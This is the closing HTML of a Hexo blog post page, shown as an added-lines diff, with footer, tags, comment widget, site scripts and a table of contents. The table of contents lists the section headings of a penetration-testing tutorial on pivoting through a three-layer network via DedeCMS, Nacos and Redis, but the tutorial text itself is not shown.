+            <strong>链接:</strong> https://tamoon1.github.io/2026/02/02/Internal-network-2/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8F%90%E6%9D%83/">#内网横向提权</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/Internal-network-penetration/">#Internal network penetration</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="../../../05/31/hello-world/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Hello World</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="../../../../2025/11/09/Internal-network-1/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">内网提权教程—记录一次横向操作（手把手详细思路教学</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '../../../../js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">内网提权教程——记录某三层网络渗透及综合渗透(socks代理隧道搭建，nacos未授权，redis上传Webshell)</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="nav-text">前置准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="nav-text">环境介绍</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DMZ%E4%B8%BB%E6%9C%BA%E6%B8%97%E9%80%8F"><span class="nav-text">DMZ主机渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8A%E7%AB%AF%E5%8F%A3"><span class="nav-text">探测服务以及端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DedcCMS%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">DedcCMS信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DedeCMS%E4%B8%8A%E4%BC%A0shell"><span class="nav-text">DedeCMS上传shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fscan%E7%AD%89%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-text">fscan等工具收集信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91PC%E4%B8%BB%E6%9C%BA%E6%A8%AA%E5%90%91"><span class="nav-text">内网PC主机横向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Socks%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA"><span class="nav-text">Socks代理搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E8%BD%AC%E5%8F%91%E6%B5%81%E9%87%8F"><span class="nav-text">（1）浏览器插件转发流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89proxifier%E8%BD%AC%E5%8F%91%E6%B5%81%E9%87%8F"><span class="nav-text">（2）proxifier转发流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89Kali%E8%BD%AC%E5%8F%91%E6%B5%81%E9%87%8F"><span class="nav-text">（3）Kali转发流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91PC%E7%9A%8480%E6%9C%8D%E5%8A%A1"><span class="nav-text">内网PC的80服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91PC%E7%9A%84Redis%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-text">内网PC的Redis服务（失败）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91PC%E7%9A%84nacos%E6%9C%8D%E5%8A%A1"><span class="nav-text">内网PC的nacos服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nacos-2-0-1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="nav-text">Nacos 2.0.1未授权访问漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86Redis%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%B9%B6%E4%B8%8A%E4%BC%A0Webshell"><span class="nav-text">成功登陆Redis服务，并上传Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%AA%E5%90%91"><span class="nav-text">内网服务器横向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E4%BA%8C%E5%B1%82socks%E4%BB%A3%E7%90%86"><span class="nav-text">配置二层socks代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%89%93%E5%BC%80kali%EF%BC%8C%E9%80%9A%E8%BF%87MSF%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="nav-text">方法一：打开kali，通过MSF进行攻击：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Aproxifier%E6%B7%BB%E5%8A%A0%E6%96%B0%E4%BB%A3%E7%90%86"><span class="nav-text">方法二：proxifier添加新代理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">W1nner丶</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 4 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="js/build/libs/Swup.min.js"></script>
+
+<script src="js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
